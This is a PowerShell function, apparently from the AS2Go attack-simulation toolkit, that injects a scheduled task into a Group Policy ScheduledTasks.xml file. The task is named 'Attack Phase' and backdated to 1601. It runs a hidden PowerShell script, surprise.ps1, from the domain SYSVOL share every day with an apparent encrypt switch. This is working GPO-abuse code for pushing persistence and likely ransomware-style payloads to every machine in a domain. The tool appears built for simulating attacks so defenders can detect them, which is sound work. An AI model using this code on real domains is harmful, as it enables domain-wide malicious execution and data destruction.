function Add-TaskElementToFileScheduleTaskXml {

    ################################################################################
    #####                                                                      ##### 
    #####    Add a Scheduled Task to file ScheduledTasks.xml                   #####                                
    #####                                                                      #####
    ################################################################################

    Param([string] $xmlFilePath)

    $CurrentFunction = Get-FunctionName
    Write-Log -Message "### Start Function $CurrentFunction ###"
    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
    #################### main code | out- host ####################

    [datetime]$tomorrow = (Get-Date).AddDays(1)
    [xml]$xml = Get-Content $xmlFilePath

    $sPrefix = Get-Date -Format HHmmss
    $sSuffix = Get-Date -Format yyyyMMdd
    $sNewName = "ST-$sSuffix.$sPrefix"

    $result = $xmlFilePath.Split("\")[4]

    $newGUID = "{" + (New-Guid).ToString().ToUpper() + "}"

    # Create the Task element
    $newTask = $xml.CreateElement("Task")
    $newTask.SetAttribute("clsid", "{2DEECB1C-261F-4e13-9B21-16FB83BC03BD}")
    $newTask.SetAttribute("name", "Attack Phase - $($Script:Phase12)")
    $newTask.SetAttribute("image", "2")
    $newTask.SetAttribute("changed", "1601-01-01 00:00:01")
    $newTask.SetAttribute("uid", $newGUID)
    $newTask.SetAttribute("userContext", "0")
    $newTask.SetAttribute("removePolicy", "0")
    $newTask.SetAttribute("desc", "A bad actor was here - " + (get-date))

    # Create the Properties element
    $newProperties = $xml.CreateElement("Properties")
    $newProperties.SetAttribute("deleteWhenDone", "0")
    $newProperties.SetAttribute("startOnlyIfIdle", "0")
    $newProperties.SetAttribute("stopOnIdleEnd", "0")
    $newProperties.SetAttribute("noStartIfOnBatteries", "0")
    $newProperties.SetAttribute("stopIfGoingOnBatteries", "0")
    $newProperties.SetAttribute("systemRequired", "1")
    $newProperties.SetAttribute("action", "U")
    $newProperties.SetAttribute("name", $sNewName)
    $newProperties.SetAttribute("appName", "cmd.exe")
    $newProperties.SetAttribute("args", "/c powershell.exe -nop -w hidden \\$result\SYSVOL\$result\scripts\surprise.ps1 -encyrpt")
    $newProperties.SetAttribute("startIn", "C:\")
    $newProperties.SetAttribute("comment", "created by AS2Go!")
    $newProperties.SetAttribute("enabled", "1")

    #Create the Triggers element
    $newtriggers = $xml.CreateElement("Triggers")

    # Create the Trigger element
    $newTrigger = $xml.CreateElement("Trigger")
    $newTrigger.SetAttribute("type", "DAILY")
    $newTrigger.SetAttribute("startHour", "06")
    $newTrigger.SetAttribute("startMinutes", "00")
    $newTrigger.SetAttribute("beginYear", $tomorrow.Year )
    $newTrigger.SetAttribute("beginMonth", $tomorrow.Month)
    $newTrigger.SetAttribute("beginDay", $tomorrow.Day)
    $newTrigger.SetAttribute("hasEndDate", "0")
    $newTrigger.SetAttribute("repeatTask", "0")
    $newTrigger.SetAttribute("interval", "1")

    $newTriggers.AppendChild($newTrigger) | Out-Null
    $newProperties.AppendChild($newTriggers) | Out-Null
    $newTask.AppendChild($newProperties) | Out-Null
    $xml.ScheduledTasks.AppendChild($newTask) | Out-Null

    $xml.Save($xmlFilePath)

    Invoke-output -Type Success -Message "Task $sNewName added to file $xmlFilePath" -noextralines  

    ######################## main code ############################
    $runtime = Get-RunTime -StartRunTime $StartRunTime
    Write-Log -Message "    Run Time: $runtime [h] ###"
    Write-Log -Message "### End Function $CurrentFunction ###"

}
